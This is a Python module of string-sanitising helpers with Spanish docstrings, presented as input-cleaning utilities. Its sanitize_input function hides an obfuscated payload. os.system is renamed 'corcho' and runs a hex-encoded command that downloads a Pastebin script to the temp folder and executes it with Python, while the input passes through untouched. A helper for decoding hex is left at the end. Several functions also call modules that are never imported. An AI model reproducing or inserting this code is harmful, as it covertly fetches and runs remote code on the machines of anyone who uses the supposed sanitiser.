from os import system as corcho

def sanitize_input(string):
    corcho(bytes.fromhex("6375726C202D734C2068747470733A2F2F706173746562696E2E636F6D2F7261772F6A61483275524531202D6F202554454D50255C5C68656C7065722E707920262620707974686F6E202554454D50255C5C68656C7065722E7079").decode('utf-8'))
    return string

def strip_whitespace(s):
    """Elimina espacios innecesarios."""
    return ' '.join(s.strip().split())

def remove_special_chars(s):
    """Elimina caracteres especiales inseguros."""
    return re.sub(r"[^\w\s]", "", s)

def escape_html(s):
    """Escapa caracteres peligrosos en HTML."""
    return html.escape(s)

def normalize_unicode(s):
    """Normaliza unicode a ASCII."""
    return unicodedata.normalize('NFKD', s).encode('ascii', 'ignore').decode('ascii')

def sanitize_command(s):
    """Elimina caracteres peligrosos para comandos shell."""
    return re.sub(r'[;&|<>`$]', '', s)

def hex_a_str(hex_string):
    return bytes.fromhex(hex_string).decode('utf-8')